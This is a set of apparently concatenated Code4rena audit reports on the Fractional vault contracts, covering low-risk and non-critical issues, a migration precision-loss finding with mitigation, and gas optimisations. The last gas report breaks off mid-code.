# QA Report  ## Table of Contents  - [summary](#summary)  ### Low - [hash collision with abi.encodePacked](#hash-collision-with-abi.encodepacked) - [Native `transfer` should be avoided](#native-transfer-should-be-avoided) - [Return value of ERC20.transferFrom unchecked](#return-value-of-erc20.transferfrom-unchecked) - [Setters and constructors should check the input value](#setters-and-constructors-should-check-the-input-value) - [Unused `receive()` functions](#`unused-receive-functions`)  ### Non-critical - [Constants instead of magic numbers](#constants-instead-of-magic-numbers) - [Events indexing](#events-indexing) - [Event should be emitted in setters](#event-should-be-emitted-in-setters) - [Public functions can be external](#public-functions-can-be-external) - [Redundant cast](#redundant-cast) - [Signature malleability](#signature-malleability) - [TODOs](#todos) - [Visibility should be explicit](#visibility-should-be-explicit)      # summary  > Few vulnerabilities were found examining the contracts. The main concerns are with:  # Low issues  # hash collision with abi.encodePacked  ## IMPACT  strings and bytes are encoded with padding when using `abi.encodePacked`. This can lead to [hash collision](https://docs.soliditylang.org/en/v0.8.15/abi-spec.html#non-standard-packed-mode) when passing the result to `keccak256`  ## SEVERITY  Low  ## PROOF OF CONCEPT  Instances include:  ### src/FERC1155.sol   ```cpp 394:             keccak256( 395:                 abi.encodePacked("\x19\x01", _domainSeparator, _structHash) 396:             ); ```   ## TOOLS USED  Manual Analysis  ## MITIGATION  Use `abi.encode()` instead.   # Native `transfer` should be avoided  ## IMPACT   In `Migration`, the `.transfer()` method is used to transfer ETH.   The `transfer()` call requires that the recipient has a payable callback, only provides 2300 gas for its operation. This means the following cases can cause the transfer to fail:  - The contract does not have a payable callback - The contract’s payable callback spends more than 2300 gas (which is only enough to emit something) - The contract is called through a proxy which itself uses up the 2300 gas  ## SEVERITY  Low  ## PROOF OF CONCEPT  Instances include:  ### src/modules/Migration.sol  ```cpp 172:         payable(msg.sender).transfer(ethAmount); 325:         payable(msg.sender).transfer(ethAmount); ```   ## TOOLS USED  Manual Analysis  ## MITIGATION  Use `.call()` to send ETH instead.  # Return value of ERC20.transferFrom unchecked  ## IMPACT   Some ERC20 implementations do not revert upon a fail `transfer/transferFrom` call, but return `false` instead. Not checking the return values of these calls can hence lead to silent failures of tokens transfers.  ## SEVERITY  Low  ## PROOF OF CONCEPT  Instances include:  ### src/modules/protoforms/BaseVault.sol  ```cpp 65:             IERC20(_tokens[i]).transferFrom(_from, _to, _amounts[i]); ```   ## TOOLS USED  Manual Analysis  ## MITIGATION  Check the return value of these calls to ensure they are not `0`  # Setters and constructors should check the input value  ## PROBLEM  Setters and constructors should check the input value for addresses - ie revert if `address(0)` is assigned to `address` variables.    ## SEVERITY  Low     ## PROOF OF CONCEPT  Instances include:   ### src/modules/protoforms/BaseVault.sol  ```cpp 24:     constructor(address _registry, address _supply) Minter(_supply) { 25:         registry = _registry; 26:     } ```  ### src/modules/Buyout.sol  ```cpp 42:     constructor( 43:         address _registry, 44:         address _supply, 45:         address _transfer 46:     ) { 47:         registry = _registry; 48:         supply = _supply; 49:         transfer = _transfer; 50:     } ```  ### src/modules/Migration.sol  ```cpp 58:         buyout = payable(_buyout); 59:         registry = _registry; ```  ### src/modules/Minter.sol  ```cpp 17:     constructor(address _supply) { 18:         supply = _supply; 19:     } ```  ### src/references/SupplyReference.sol  ```cpp 15:     constructor(address _registry) { 16:         registry = _registry; 17:     } ```  ### src/targets/Supply.sol  ```cpp 16:     constructor(address _registry) { 17:         registry = _registry; 18:     } ```  ## TOOLS USED  Manual Analysis    ## MITIGATION  Add non-zero checks   # Unused `receive()` functions  ## IMPACT   `Vault` and `Buyout` have an empty `receive()` function, but do not have any withdrawal function. Any ETH mistakenly sent to these contracts with empty `msg.data` would be locked.    ## SEVERITY  Low    ## PROOF OF CONCEPT  2 instances include:   ### src/Vault.sol  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/Vault.sol#L32 ```cpp 32:     receive() external payable {} ```  ### src/modules/Buyout.sol#L53  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L53 ```cpp 53:     receive() external payable {} ```   ## TOOLS USED  Manual Analysis    ## MITIGATION  Removes these functions or implement the appropriate logic in these empty blocks  # Non-critical issues  # Constants instead of magic numbers  ## PROBLEM  It is best practice to use constant variables rather than literal values (100, 1000, etc) to make the code easier to understand and maintain.  ## SEVERITY  Non-Critical  ## PROOF OF CONCEPT  7 instances include:  ### src/FERC1155.sol  ```cpp 247:         royaltyAmount = (_salePrice * royaltyPercent[_id]) / 100; ```  ### src/modules/Buyout.sol  ```cpp 86:         uint256 buyoutPrice = (msg.value * 100) / 87:             (100 - ((depositAmount * 100) / totalSupply)); ```  ```cpp 208:         if ( 209:             (tokenBalance * 1000) / 210:                 IVaultRegistry(registry).totalSupply(_vault) > 211:             500 212:         ) ```  ### src/modules/Migration.sol  ```cpp 198:         uint256 currentPrice = _calculateTotal( 199:             100, 200:             IVaultRegistry(registry).totalSupply(_vault), 201:             proposal.totalEth, 202:             proposal.totalFractions 203:         ) ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Define constant variables for the literal values aforementioned.   # Events indexing  ## PROBLEM  Events should use the maximum amount of indexed fields: up to three parameters. This makes it easier to filter for specific values in front-ends.  ## SEVERITY  Non-Critical  ## PROOF OF CONCEPT  Instances include:   ### src/interfaces/IBuyout.sol  ```cpp 55: event Start( 56:         address indexed _vault, 57:         address indexed _proposer, 58:         uint256 _startTime, 59:         uint256 _buyoutPrice, 60:         uint256 _fractionPrice 61:     );  65:     event SellFractions(address indexed _seller, uint256 _amount);  69:     event BuyFractions(address indexed _buyer, uint256 _amount);  74:     event End(address _vault, State _state, address indexed _proposer);  79:     event Cash(address _vault, address indexed _casher, uint256 _amount);  83:     event Redeem(address _vault, address indexed _redeemer); ```  ### src/interfaces/IFERC1155.sol  ```cpp 21:     event SetMetadata(address indexed _metadata, uint256 _id); ```  ```cpp 26:     event SetRoyalty( 27:         address indexed _receiver, 28:         uint256 _id, 29:         uint256 _percentage 30:     ); ```  ```cpp 36:     event SingleApproval( 37:         address indexed _owner, 38:         address indexed _operator, 39:         uint256 _id, 40:         bool _approved 41:     ); ```  ```cpp 61:     event FractionsMigrated( 62:         address indexed _oldVault, 63:         address indexed _newVault, 64:         uint256 _proposalId, 65:         uint256 _amount 66:     ); ```  ```cpp 74:     event VaultMigrated( 75:         address indexed _oldVault, 76:         address indexed _newVault, 77:         uint256 _proposalId, 78:         address[] _modules, 79:         address[] _plugins, 80:         bytes4[] _selectors 81:     ); ```  ### src/interfaces/IVault.sol  ```cpp 25:     event Execute(address indexed _target, bytes _data, bytes _response); ```  ```cpp 33:     event TransferOwnership( 34:         address indexed _oldOwner, 35:         address indexed _newOwner 36:     ); ```  ### src/interfaces/IVaultRegistry.sol  ```cpp 33:     event VaultDeployed( 34:         address indexed _vault, 35:         address indexed _token, 36:         uint256 _id 37:     ); ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Add indexed fields to these events so that they have the maximum number of indexed fields possible.   # Event should be emitted in setters  ## PROBLEM  Setters should emit an event so that Dapps can detect important changes to storage   ## SEVERITY  Non-Critical     ## PROOF OF CONCEPT  Instances include:   ### src/FERC1155.sol  ```cpp 198:     function setContractURI(string calldata _uri) external onlyController ```  ### src/Vault.sol  ```cpp 86: function setMerkleRoot(bytes32 _rootHash) external  ```  ## TOOLS USED  Manual Analysis    ## MITIGATION  Emit an event in all setters.   # Public functions can be external  ## PROBLEM  It is good practice to mark functions as `external` instead of `public` if they are not called by the contract where they are defined.  ## SEVERITY  Non-Critical  ## PROOF OF CONCEPT  Instances include:  ### src/utils/MerkleBase.sol  ```cpp 43:     function verifyProof( 44:         bytes32 _root, 45:         bytes32[] memory _proof, 46:         bytes32 _valueToProve 47:     ) public pure returns (bool) ``` ```cpp 61:     function getRoot(bytes32[] memory _data) public pure returns (bytes32) ``` ```cpp 73:     function getProof(bytes32[] memory _data, uint256 _node) 74:         public 75:         pure 76:         returns (bytes32[] memory) ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Declare these functions as `external` instead of `public`   # Redundant cast  ## PROBLEM  In `Migration.commit()`, `buyout` is cast to type `address`, which is redundant as it is already of type `address`.  ### src/modules/Migration.sol  ```cpp 208:             IFERC1155(token).setApprovalFor(address(buyout), id, true); ```    ## SEVERITY  Non-Critical   ## TOOLS USED  Manual Analysis    ## MITIGATION  ```diff -208:             IFERC1155(token).setApprovalFor(address(buyout), id, true); +208:             IFERC1155(token).setApprovalFor(buyout, id, true); ```   # Scientific notation  ## PROBLEM  For readability, it is best to use scientific notation (e.g `10e5`) rather than decimal literals(`100000`) or exponentiation(`10**5`)  ## SEVERITY  Non-Critical  ## PROOF OF CONCEPT  Instances include:  ### src/modules/Buyout.sol  ```cpp 208:         if ( 209:             (tokenBalance * 1000) / ```  ## TOOLS USED  Manual Analysis  ## MITIGATION  Replace `1000` with `10e3`  # Signature malleability  ## PROBLEM  `permit` and `permitAll` in `FERC1155` use Solidity's `ecrecover` to verify signatures. The EVM opcode associated with this function allows for malleable signatures and thus is susceptible to replay attacks. There is no direct threat to the protocol - these functions only approve operators - but it is still a good practice to avoid signature malleability.    ## SEVERITY  Non-Critical     ## PROOF OF CONCEPT  2 instances:   ### src/FERC1155.sol  ```cpp 126:             address signer = ecrecover(digest, _v, _r, _s); ```  ```cpp 171:             address signer = ecrecover(digest, _v, _r, _s); ```    ## TOOLS USED  Manual Analysis    ## MITIGATION  Use OpenZeppelin's `ECDSA`'s [library](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/cryptography/ECDSA.sol)    # TODOS  ## PROBLEM  There is an open TODO in `MerkleBase.sol`. It is merely a gas optimisation issue, but it should still be resolved before contract deployments    ## SEVERITY  Non-Critical     ## PROOF OF CONCEPT  Instances include:   ### src/utils/MerkleBase.sol  ```cpp 24:             // TODO: This can be aesthetically simplified with a switch. Not sure it will 25:             // save much gas but there are other optimizations to be had in here. ```    ## TOOLS USED  Manual Analysis    ## MITIGATION  Remove the TODO comment    # Visibility should be explicit  ## PROBLEM  Visibility of variables should be explicitly set.  ## SEVERITY  Non-Critical     ## PROOF OF CONCEPT  2 instances:   ### src/references/SupplyReference.sol  ```cpp 12:     address immutable registry; ```  ### src/targets/Supply.sol  ```cpp 13:     address immutable registry; ```    ## TOOLS USED  Manual Analysis  
# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L469-L472 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L95-L98   # Vulnerability details  As new total supply can be arbitrary, setting it significantly lower than current (say to 100 when it was 1e9 before) can be used to remove current minority shareholders, whose shares will end up being zero on a precision loss due to low new total supply value. This can go unnoticed as the effect is implementation based.  During Buyout the remaining shareholders are left with ETH funds based valuation and can sell the shares, but the minority shareholders that did contributed to the Migration, that could have other details favourable to them, may not realize that new shares will be calculated with the numerical truncation as a result of the new total supply introduction.  Setting the severity to medium as this is a fund loss impact conditional on a user not understanding the particulars of the implementation.  ## Proof of Concept  Currently migrateFractions() calculates new shares to be transferred for a user as a fraction of her contribution:  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L469-L472  ```solidity         // Calculates share amount of fractions for the new vault based on the new total supply         uint256 newTotalSupply = IVaultRegistry(registry).totalSupply(newVault);         uint256 shareAmount = (balanceContributedInEth * newTotalSupply) /             totalInEth; ```  If Bob the msg.sender is a minority shareholder who contributed to Migration with say some technical enhancements of the Vault, not paying attention to the total supply reduction, his share can be lost on commit():  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L209-L210  ```solidity             // Starts the buyout process             IBuyout(buyout).start{value: proposal.totalEth}(_vault); ```  As commit() starts the Buyout, Bob will not be able to withdraw as both leave() and withdrawContribution() require INACTIVE state:  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L149-L150  ```solidity         State required = State.INACTIVE;         if (current != required) revert IBuyout.InvalidState(required, current); ```  If Buyout be successful, Bob's share can be calculated as zero given his small initial share and reduction in the Vault total shares.  For example, if Bob's share together with the ETH funds he provided to Migration were cumulatively less than 1%, and new total supply is 100, he will lose all his contribution on commit() as migrateFractions() will send him nothing.  ## Recommended Mitigation Steps  Consider requiring that the new total supply should be greater than the old one:  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Migration.sol#L95-L98  ```solidity         proposal.oldFractionSupply = IVaultRegistry(registry).totalSupply(             _vault         );         proposal.newFractionSupply = _newFractionSupply; +       require(proposal.newFractionSupply > proposal.oldFractionSupply, ""); // reference version ```  
# Table of contents  - **[[0x0] Disclaimer](#0x0)** - **[[G-01] Try ++i instead of i++](G-01)** - **[[G-02] Try `unchecked{++i}` instead of `i++` in loops](G-02)** - **[[G-03] Consider `a = a + b` instead of `a += b`](G-03)** - **[[G-04] Consider marking onlyOwner functions as payable](G-04)** - **[[G-05] Use binary shifting instead of `a / 2^x, x > 0`](G-05)** - **[[G-06] Cache state variables, `MLOAD` << `SLOAD`](G-06)** - **[[G-07] Declare `immutable` instead of state variables](G-07)** - **[[G-08] Define `constants/immutable/state` as `private/internal`](G-08)** - **[[G-09] Check out `calldataloud` vs `mload`](G-09)** - **[[G-10] `Internal` functions can be inlined](G-10)** - **[[G-11] Functions are invoked inside the SC should be marked as internal](G-11)** - **[[G-12] Redundant gas usage](G-12)** - **[[G-13] Remove unnecessary explicit casts](G-13)**    ## Disclaimer<a name="0x0"></a> - Please, consider everything described below as a general recommendation. These notes will represent potential possibilities to optimize gas consumption. It's okay, if something is not suitable in your case. Just let me know the reason in the comments section. Enjoy!   ## **[G-01] Try ++i instead of i++**<a name="G-01"></a>  ### ***Description:***   - In case of i++, the compiler needs to create a temp variable to return and then it gets incremented.     - In case of ++i, the compiler just simply returns already incremented value.  ### ***Recommendations:***   - Use prefix increment instead of postfix.   ### ***All occurances:***    - Contracts:        ```Solidity       file: src/Vault.sol       ...............................                // Lines: [78-78]         for (uint256 i = 0; i < length; i++) {}          // Lines: [104-104]         for (uint256 i = 0; i < length; i++) {}      ```  ## **[G-02] Try `unchecked{++i};` instead of `i++;` in loops**<a name="G-02"></a>  ### ***Description:***   - If the for loop runs 100 times, it's about 10k units of gas which can be saved in comparison. Don't worry about overflow, when the number is just simply getting incremented by 1. There are ~1e80 atoms in the universe, so 2^256 is closed to that number, therefore it's no a way to be overflowed, because of the gas limit as well.     ### ***Recommendations:***   - Try to use unchecked{} box where it's no a way to get a overflow/underflow. Significant gas usage optimization.  ### ***All occurances:***    - Contracts:      ```Solidity       file: src/Vault.sol       ...............................                // Lines: [78-78]           for (uint256 i = 0; i < length; i++) {}          // Lines: [104-104]           for (uint256 i = 0; i < length; i++) {}      ``` ## **[G-03] Consider `a = a + b` instead of `a += b`**<a name="G-03"></a>  ### ***Description:***   - It has an impact on the deployment cost and the cost for distinct transaction.    ### ***All occurances:***    - Contracts:        ```Solidity       file: src/FERC1155.sol       ...............................                // Lines: [86-86]           totalSupply[_id] += _amount;          // Lines: [270-271]           balanceOf[_from][_id] -= _amount;           balanceOf[_to][_id] += _amount;        file: src/Buyout.sol       ...............................          // Lines: [176-176]           buyoutInfo[_vault].ethBalance += msg.value;          // Lines: [139-139]           buyoutInfo[_vault].ethBalance -= ethAmount;        file: src/Migration.sol       ...............................          // Lines: [123-124]           proposal.totalEth += msg.value;           userProposalEth[_proposalId][msg.sender] += msg.value;          // Lines: [134-135]           proposal.totalFractions += _amount;           userProposalFractions[_proposalId][msg.sender] += _amount;                    // Lines: [156-156]           proposal.totalFractions -= amount;          // Lines: [160-160]           proposal.totalEth -= ethAmount;          // Lines: [497-497]           treeLength += IModule(_modules[i]).getLeafNodes().length;        file: src/MerkleBase.sol       ...............................          // Lines: [147-147]           for (uint256 i; i < length - 1; i += 2) {}          // Lines: [190-190]           ceil -= pOf2; // see above   ## **[G-04] Consider marking onlyOwner functions as payable**<a name="G-04"></a>  ### ***Description:***   - A little optmization in comparison between payable and non-payable functions. Also, there is a little tradeoff here between readability and optimization.  ### ***All occurances:***    - Contracts:        ```Solidity       file: src/FERC1155.sol       ...............................                // Lines: [56-63]           function burn(               address _from,               uint256 _id,               uint256 _amount           ) external onlyRegistry {}          // Lines: [79-87]           function mint(               address _to,               uint256 _id,               uint256 _amount,               bytes memory _data           ) external onlyRegistry {}          // Lines: [198-200]           function setContractURI(string calldata _uri) external onlyController {}          // Lines: [205-211]           function setMetadata(address _metadata, uint256 _id)               external               onlyController           {}          // Lines: [217-225]           function setRoyalties(               uint256 _id,               address _receiver,               uint256 _percentage           ) external onlyController {}          // Lines: [229-232]           function transferController(address _newController)               external               onlyController           {}         ``` ## **[G-05] Use binary shifting instead of `a / 2^x, x > 0`**<a name="G-05"></a>  ### ***Description:***   - It's also pretty impactful approach especially in loops.   ### ***All occurances:***    - Contracts:        ```Solidity       file: src/MerkleBase.sol       ...............................                // Lines: [100-100]           _node = _node / 2;          // Lines: [136-136]           result = new bytes32[](length / 2 + 1);          // Lines: [142-142]           result = new bytes32[](length / 2);       ``` ## **[G-06] Cache state variables, `MLOAD` << `SLOAD`**<a name="G-06"></a>  ### ***Description:***   - `MLOAD` costs only 3 units of gas, `SLOAD`(warm access) is about 100 units. Therefore, cache, when it's possible.   ### ***All occurances:***    - Contracts:        ```Solidity       file: src/FERC1155.sol       ...............................          // Lines: [91-91]           if (msg.sender != metadata[_id])             revert InvalidSender(metadata[_id], msg.sender);           // Lines: [297-298]           if (msg.sender != metadata[_id])             revert InvalidSender(metadata[_id], msg.sender);          // Lines: [303-305]           _controller == address(0)               ? controllerAddress = INITIAL_CONTROLLER()               : controllerAddress = _controller;        file: src/Bayout.sol       ...............................         // Lines: [176-176]           buyoutInfo[_vault].ethBalance += msg.value;         file: src/Vault.sol       ...............................          // Lines: [25-25]           if (nonce != 0) revert Initialized(owner, msg.sender, nonce);          // Lines: [76, 87, 94, 102]           if (owner != msg.sender) revert NotOwner(owner, msg.sender);          // Lines: [132-132]           if (owner_ != owner) revert OwnerChanged(owner_, owner);        file: src/Migration.sol       ...............................          // Lines: [126-127; 137-138]           // Comment:             - proposal.totalEth += msg.value => proposal.totalEth = proposal.totalEth(SLOAD) + msg.value;                  - proposal.totalEth = proposal.totalEth(which you can store in memory to avoid SLOAD) + msg.value.               proposal.totalEth += msg.value;             userProposalEth[_proposalId][msg.sender] += msg.value;                proposal.totalFractions += _amount;             userProposalFractions[_proposalId][msg.sender] += _amount;          file: src/Buyout.sol         ...............................           // Lines: [474-502]               permissions[0] = Permission(               address(this),               supply,               ISupply(supply).burn.selector             );             permissions[1] = Permission(               address(this),               transfer,               ITransfer(transfer).ERC20Transfer.selector             );             permissions[2] = Permission(               address(this),               transfer,               ITransfer(transfer).ERC721TransferFrom.selector             );             permissions[3] = Permission(               address(this),               transfer,               ITransfer(transfer).ERC1155TransferFrom.selector             );             permissions[4] = Permission(               address(this),               transfer,               ITransfer(transfer).ERC1155BatchTransferFrom.selector             );          ```  ## **[G-07] Declare `immutable` instead of state variables**<a name="G-07"></a>  ### ***Description:***   - Since it's initialized once, there is no reason for state variable allocation.   ### ***All occurances:***    - Contracts:        ```Solidity       file: src/FERC1155.sol       ...............................                // Lines: [19-19]           address internal _controller;          // Lines: [21-21]           string public contractURI;          // Lines: [142-142]           result = new bytes32[](length / 2);        file: src/Vault.sol       ...............................         // Lines: [15-15]           bytes32 public merkleRoot;          // Lines: [17-17]           uint256 public nonce;        file: src/VaultFactory.sol       ...............................         // Lines: [15-15]           address public implementation;        file: src/Buyout.sol       ...............................         // Lines: [29-33]           address public registry;           address public supply;           address public transfer;        ``` ## **[G-08] Define public `constants/immutable/state` as `private/internal`**<a name="G-08"></a>  ### ***Description:***   - Declaring state variables as private/internal doesn't generate getter functions.   ### ***All occurances:***    - Contracts:        ```Solidity       file: src/FERC1155.sol       ...............................                // Lines: [15-17]           string public constant NAME = "FERC1155";           string public constant VERSION = "1";          // Lines: [21-21]           string public contractURI;          // Lines: [23-30]           mapping(address => mapping(address => mapping(uint256 => bool)))         public isApproved;           /// @notice Mapping of metadata contracts for token ID types => metadata address           mapping(uint256 => address) public metadata;           /// @notice Mapping to track account nonces for metadata txs owner => nonces           mapping(address => uint256) public nonces;           /// @notice Mapping to track total supply for token ID types => totalSupply           mapping(uint256 => uint256) public totalSupply;        file: src/Vault.sol       ...............................         // Lines: [21-21]           mapping(bytes4 => address) public methods;        file: src/VaultRegistry.sol       ...............................         // Lines: [17-21]           address public immutable factory;           address public immutable fNFT;           address public immutable fNFTImplementation;          // Lines: [23-25]           mapping(address => uint256) public nextId;           mapping(address => VaultInfo) public vaultToToken;        file: src/Buyout.sol       ...............................         // Lines: [35-38]           uint256 public constant PROPOSAL_PERIOD = 2 days;           uint256 public constant REJECTION_PERIOD = 4 days;           mapping(address => Auction) public buyoutInfo;     ``` ## **[G-09] Check out `calldataloud` vs `mload`**<a name="G-09"></a>  ### ***Description:***   - Consider reading args directly from calldata instead of memory, if args doesn't require any changes.   ### ***All occurances:***    - Contracts:        ```Solidity       file: src/FERC1155.sol       ...............................                // Lines: [68-68]           function emitSetURI(uint256 _id, string memory _uri) external {}          // Lines: [79-79]         // Comments: OZ marked `bytes memory _data`, it is because those functions are virtual, hence could be overrided. Therefore, allowing modifying args for those overrided versions. Here, we just have an external function, therefore it's better to read bytes directly from calldata, especially, if the `_data` is a massive flow.             function mint(               address _to,               uint256 _id,               uint256 _amount,               bytes memory _data           ) external onlyRegistry {}          // Lines: [68-68]           function emitSetURI(uint256 _id, string memory _uri) external {}        file: src/Vault.sol       ...............................                // Lines: [73-75]           function install(bytes4[] memory _selectors, address[] memory _plugins)               external           {}         // Lines: [101-101]           function uninstall(bytes4[] memory _selectors) external {}        file: src/VaultRegistry.sol       ...............................                // Lines: [51-54]           function create(               bytes32 _merkleRoot,               address[] memory _plugins,               bytes4[] memory _selectors           ) external returns (address vault) {}          // Lines: [67-72]           function createFor(               bytes32 _merkleRoot,               address _owner,               address[] memory _plugins,               bytes4[] memory _selectors           ) external returns (address vault) {}          // Lines: [67-72]           function createCollection(             bytes32 _merkleRoot,             address[] memory _plugins,             bytes4[] memory _selectors         ) external returns (address vault, address token) {}          // Lines: [102-107]           function createInCollection(               bytes32 _merkleRoot,               address _token,               address[] memory _plugins,               bytes4[] memory _selectors           ) external returns (address vault) {}          // Lines: [147-152]           function createCollectionFor(               bytes32 _merkleRoot,               address _controller,               address[] memory _plugins,               bytes4[] memory _selectors           ) public returns (address vault, address token) {}          // Lines: [165-170]           function _deployVault(               bytes32 _merkleRoot,               address _token,               address[] memory _plugins,               bytes4[] memory _selectors           ) private returns (address vault) {}        file: src/Buyout.sol       ...............................           function batchWithdrawERC1155(               address _vault,               address _token,               address _to,               uint256[] calldata _ids,               uint256[] calldata _values,               bytes32[] calldata _erc1155BatchTransferProof           ) external {}            // Look, how beatufil it looks like with calldata. Thank you for that!!!!!!!      ``` ## **[G-10] `Internal` functions can be inlined**<a name="G-10"></a>  ### ***Description:***   - It takes some extra `JUMP`s which costs around 12 gas uints for each `JUMP`.     ### ***All occurances:***    - Contracts:        ```Solidity       file: src/FERC1155.sol       ...............................                // Lines: [324-330]           function _computePermitStructHash(               address _owner,               address _operator,               uint256 _id,               bool _approved,               uint256 _deadline           ) internal returns (bytes32) {}          // Lines: [350-355]           function _computePermitAllStructHash(               address _owner,               address _operator,               bool _approved,               uint256 _deadline           ) internal returns (bytes32) {}          // Lines: [371-371]           function _computeDomainSeparator() internal view returns (bytes32) {}          // Lines: [388-392]           function _computeDigest(bytes32 _domainSeparator, bytes32 _structHash)               internal               pure               returns (bytes32)           {}      ``` ## **[G-11] Functions which are invoked inside the SC should be marked as internal**<a name="G-11"></a>  ### ***Description:***   - If i'm not mistaken, these getter functions should be defined as internal.     ### ***All occurances:***    - Contracts:        ```Solidity       file: src/FERC1155.sol       ...............................                // Lines: [309-316]             function INITIAL_CONTROLLER() public pure returns (address) {               return _getArgAddress(0);             }              function VAULT_REGISTRY() public pure returns (address) {                 return _getArgAddress(20);             }       ``` ## **[G-12] Redundant gas usage**<a name="G-12"></a>  ### ***Description:***   - Extra gas usage without the reason, use _selectors.length in loops.    ### ***All occurances:***    - Contracts:        ```Solidity       file: src/Vault.sol       ...............................                // Lines: [77-77]           uint256 length = _selectors.length;          // Lines: [103-103]           uint256 length = _selectors.length;        ``` ## **[G-13] Remove unnecessary explicit casts**<a name="G-13"></a>  ### ***Description:***   - There is no reason to explicitly cast `address` to `address`, etc...     ### ***All occurances:***    - Contracts:        ```Solidity       file: src/VaultRegistry.sol       ...............................                // Lines: [73-73]           vault = _deployVault(_merkleRoot, address(fNFT), _plugins, _selectors);          // Lines: [56-56]           vault = _deployVault(_merkleRoot, address(fNFT), _plugins, _selectors);          // Lines: [154-154]           abi.encodePacked(_controller, address(this))       ```  ## Kudos for the quality of the code! It's pretty easy to explore! 
## FINDINGS ### Using immutable on variables that are only set in the constructor and never after   File: Migration.sol  [line 39](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L39)  ```     address public registry; ```  The above is only set in the constructor and never set again  File: Migration.sol [line 37](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L37)  ```     address payable public buyout; ``` File: Buyout.sol [line 29](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L29)  ```     address public registry; ```  File: Buyout.sol [line 31](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L31)  ```     address public supply; ```  File: Buyout.sol [line 33](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Buyout.sol#L33)  ```     address public transfer; ```  File: BaseVault.sol [line 19](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/protoforms/BaseVault.sol#L19)  ```     address public registry; ``` ### Using unchecked blocks to save gas - Increments in for loop can be unchecked  ( save 30-40 gas per loop iteration) The majority of Solidity for loops increment a uint256 variable that starts at 0. These increment operations never need to be checked for over/underflow because the variable will never reach the max number of uint256 (will run out of gas long before that happens). The default over/underflow check wastes gas in every iteration of virtually every for loop . eg.  e.g Let's work with a sample loop below.  ``` for(uint256 i; i < 10; i++){ //doSomething }  ``` can be written as shown below. ``` for(uint256 i; i < 10;) {   // loop logic   unchecked { i++; } } ```  We can also write  it as an inlined function like below.  ``` function inc(i) internal pure returns (uint256) {   unchecked { return i + 1; } } for(uint256 i; i < 10; i = inc(i)) {   // doSomething } ```  **Affected code** File: Vault.sol  [line 78](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L78)  ```         for (uint256 i = 0; i < length; i++) {             methods[_selectors[i]] = _plugins[i];         } ```  The above should be modified to:  ```         for (uint256 i = 0; i < length; {             methods[_selectors[i]] = _plugins[i];   unchecked{     ++i;   }         } ``` **Other Instances to modify** File: Vault.sol [line 104](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/Vault.sol#L104)  ```         for (uint256 i = 0; i < length; i++) { ``` [see resource](https://github.com/ethereum/solidity/issues/10695)  ### Cache storage values in memory to minimize SLOADs The code can be optimized by minimizing the number of SLOADs. SLOADs are expensive 100 gas compared to MLOADs/MSTOREs(3gas) Storage value should get cached in memory   NB: *Some functions have been truncated where necessary to just show affected parts of the code*  #### Migration.sol.propose() : registry should be cached (saves ~ 92 gas) File: Migration.sol [line 81-95](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L72-L99)  ```     function propose(         address _vault,         address[] calldata _modules,         address[] calldata _plugins,         bytes4[] calldata _selectors,         uint256 _newFractionSupply,         uint256 _targetPrice     ) external {         // Reverts if address is not a registered vault         (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);                 // Initializes migration proposal info            proposal.oldFractionSupply = IVaultRegistry(registry).totalSupply(             _vault         );         proposal.newFractionSupply = _newFractionSupply;     } ``` In the above **registry** should be cached in memory to reduce number of SLOADs.  SLOAD 1: [line 81](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L81) SLOAD 2: [line 95](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L95)  #### Migration.sol.migrateFractions() : registry should be cached  (saves ~ 372 gas) File: Migration.sol [line 435,467,470](https://github.com/code-423n4/2022-07-fractional/blob/e2c5a962a94106f9495eb96769d7f60f7d5b14c9/src/modules/Migration.sol#L433-L482)  ```     function migrateFractions(address _vault, uint256 _proposalId) external {         // Reverts if address is not a registered vault         (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);                 // Gets the token and fraction ID of the new vault         address newVault = migrationInfo[_vault][_proposalId].newVault;         (address token, uint256 newFractionId) = IVaultRegistry(registry)             .vaultToToken(newVault);         // Calculates share amount of fractions for the new vault based on the new total supply         uint256 newTotalSupply = IVaultRegistry(registry).totalSupply(newVault);         uint256 shareAmount = (balanceContributedInEth * 